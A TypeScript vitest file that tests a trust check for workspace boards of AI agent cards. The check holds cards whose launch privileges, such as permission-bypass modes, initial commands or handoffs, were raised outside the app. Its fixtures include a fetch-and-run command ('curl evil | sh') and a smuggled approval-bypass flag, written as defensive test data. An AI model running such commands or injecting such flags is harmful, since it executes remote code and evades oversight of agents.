import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { diffPrivileges, privilegeView, revertPrivileges, trustedIncoming } from '../src/shared/board-trust'
import { BoardTrust } from '../src/main/board-trust'
import { onBoardWritten, readWorkspace, saveLedger, saveWorkspace, WORKSPACE_FILE } from '../src/main/workspace-store'
import type { NodeData, Workspace } from '../src/shared/types'

const node = (id: string, data: Partial<NodeData>) => ({ id, position: { x: 0, y: 0 }, data: { kind: 'claude', title: id, cwd: 'C:/p', ...data } as NodeData })
const views = (...ns: ReturnType<typeof node>[]) => Object.fromEntries(ns.map((n) => [n.id, privilegeView(n.data, n.id, [])]))

describe('diffPrivileges', () => {
  it('holds a known card whose launch fields changed, not one whose title or layout changed', () => {
    const held = diffPrivileges(views(node('a', {}), node('b', {})), [node('a', { title: 'renamed' }), node('b', { claude: { boardTools: true, permissionMode: 'bypassPermissions' } })])
    expect(held.map((h) => h.nodeId)).toEqual(['b'])
    expect(held[0].changes.map((c) => c.field).sort()).toEqual(['claude.boardTools', 'claude.permissionMode'])
  })
  it('holds a new card only when it raises rights (role and resume count)', () => {
    const held = diffPrivileges({}, [
      node('plain', { engine: 'codex', parentId: 'x' }),
      node('cmd', { kind: 'terminal', initialCommand: 'curl evil | sh' }),
      node('chief', { kind: 'conductor' }),
      node('roled', { role: 'security-engineer' }),
      node('resumer', { claude: { resume: '--dangerously-bypass-approvals-and-sandbox' } })
    ])
    expect(held.map((h) => h.nodeId).sort()).toEqual(['chief', 'cmd', 'resumer', 'roled'])
  })
  it('holds the target of a handoff line added outside the app', () => {
    const before = views(node('w', {}), node('chief', { kind: 'conductor' }))
    const edges = [{ source: 'w', target: 'chief', data: { mode: 'auto', template: 'run {{output}}' } }]
    const held = diffPrivileges(before, [node('w', {}), node('chief', { kind: 'conductor' })], edges)
    expect(held.map((h) => [h.nodeId, h.changes[0].field])).toEqual([['chief', 'handoffs']])
  })
  it('treats empty values as unset and survives a card with no data', () => {
    expect(diffPrivileges(views(node('a', {})), [node('a', { claude: { extraArgs: [], mcpServers: {}, boardTools: false } })])).toEqual([])
    expect(() => diffPrivileges({}, [{ id: 'z', data: null }])).not.toThrow()
  })
})

describe('revertPrivileges', () => {
  it('puts the trusted values back and drops forged ones', () => {
    const trusted = privilegeView(node('a', { claude: { permissionMode: 'default', model: 'opus' } as NodeData['claude'] }).data, 'a', [])
    const forged = node('a', { claude: { permissionMode: 'bypassPermissions', extraArgs: ['--x'], model: 'opus', resume: 'evil' } as NodeData['claude'], initialCommand: 'x' }).data
    const out = revertPrivileges(forged, trusted)
    expect(out.claude).toEqual({ permissionMode: 'default', model: 'opus' })
    expect(out.initialCommand).toBeUndefined()
    expect(diffPrivileges({ a: trusted }, [{ id: 'a', data: out }])).toEqual([])
  })
  it('lists the trusted incoming lines', () => {
    const v = privilegeView(node('t', {}).data, 't', [{ source: 's', target: 't', data: { mode: 'manual', template: 'x' } }])
    expect(trustedIncoming(v)).toEqual([{ from: 's', mode: 'manual', template: 'x' }])
    expect(trustedIncoming({})).toEqual([])
  })
})

describe('BoardTrust with the board file', () => {
  let dir: string
  let trust: BoardTrust
  const recFile = (): string => join(dir, 'userData', 'board-trust.json')
  const file = (): string => join(dir, WORKSPACE_FILE)
  const ws = (nodes: ReturnType<typeof node>[]): Workspace => ({ version: 1, projectRoot: dir, nodes, edges: [] })
  const open = (known = true, t = trust) => t.check(dir, readWorkspace(dir)!.text, known).map((h) => h.nodeId)
  const forge = (mut: (w: Workspace) => void): void => {
    const w = JSON.parse(readFileSync(file(), 'utf8')) as Workspace
    mut(w)
    writeFileSync(file(), JSON.stringify(w, null, 2))
  }
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'ob-trust-'))
    trust = new BoardTrust(recFile())
    onBoardWritten((root, text, fromDisk) => trust.record(root, text, { fromDisk }))
  })
  afterEach(() => {
    onBoardWritten(undefined)
    rmSync(dir, { recursive: true, force: true })
  })

  it('trusts a board the app wrote, and an unrecorded board in a folder opened before', () => {
    saveWorkspace(ws([node('a', { claude: { boardTools: true } })]))
    expect(open()).toEqual([])
    expect(open(true, new BoardTrust(join(dir, 'other.json')))).toEqual([])
  })

  it('checks an unrecorded board in a folder never opened as all-new (a cloned repo)', () => {
    writeFileSync(file(), JSON.stringify(ws([node('a', {}), node('b', { claude: { permissionMode: 'bypassPermissions' } })])))
    expect(open(false)).toEqual(['b'])
    // still held after an app save and in a fresh process
    saveWorkspace(readWorkspace(dir)!.workspace)
    expect(open(false, new BoardTrust(recFile()))).toEqual(['b'])
  })

  it('holds a card edited outside the app, through an app save and a fresh process', () => {
    saveWorkspace(ws([node('a', {}), node('b', {})]))
    expect(open()).toEqual([])
    forge((w) => {
      w.nodes[1].data.claude = { boardTools: true }
    })
    expect(open()).toEqual(['b'])
    expect(trust.isHeld(dir, 'b')).toBe(true)
    saveWorkspace(readWorkspace(dir)!.workspace) // the renderer autosaves the forged data while it is held
    expect(open()).toEqual(['b'])
    expect(open(true, new BoardTrust(recFile()))).toEqual(['b'])
  })

  it('a ledger write does not launder an edit made while the app runs', () => {
    saveWorkspace(ws([node('a', {})]))
    expect(open()).toEqual([])
    forge((w) => {
      w.nodes[0].data.claude = { permissionMode: 'bypassPermissions' }
    })
    saveLedger(dir, { tasks: [], nextTaskId: 2 }) // a card claims a task: the ledger re-reads the forged file
    expect(open(true, new BoardTrust(recFile()))).toEqual(['a'])
  })

  it('a ledger write of an untouched board keeps it trusted', () => {
    saveWorkspace(ws([node('a', {})]))
    saveLedger(dir, { tasks: [], nextTaskId: 5 })
    expect(open(true, new BoardTrust(recFile()))).toEqual([])
  })

  it('holds every card when the board cannot be read as expected', () => {
    saveWorkspace(ws([node('a', {})]))
    expect(trust.check(dir, '{not json', true).map((h) => h.nodeId)).toEqual([])
    writeFileSync(file(), JSON.stringify({ version: 1, nodes: [{ id: 'a', data: { kind: 'claude', title: 'a', cwd: 'C:/p', claude: { boardTools: true } } }], edges: [] }))
    expect(open()).toEqual(['a'])
  })

  it('Trust records the change; Revert keeps the trusted view until the renderer saves', () => {
    saveWorkspace(ws([node('a', {}), node('b', {})]))
    open()
    forge((w) => {
      w.nodes[0].data.initialCommand = 'echo hi'
      w.nodes[1].data.initialCommand = 'echo forged'
    })
    expect(open()).toEqual(['a', 'b'])
    trust.release(dir, ['a'], false, readFileSync(file(), 'utf8'))
    const v = trust.release(dir, ['b'], true, readFileSync(file(), 'utf8'))
    expect(v.b.initialCommand).toBeNull()
    // quit before the renderer saved the revert: b is held again, a is trusted
    expect(open(true, new BoardTrust(recFile()))).toEqual(['b'])
  })
})
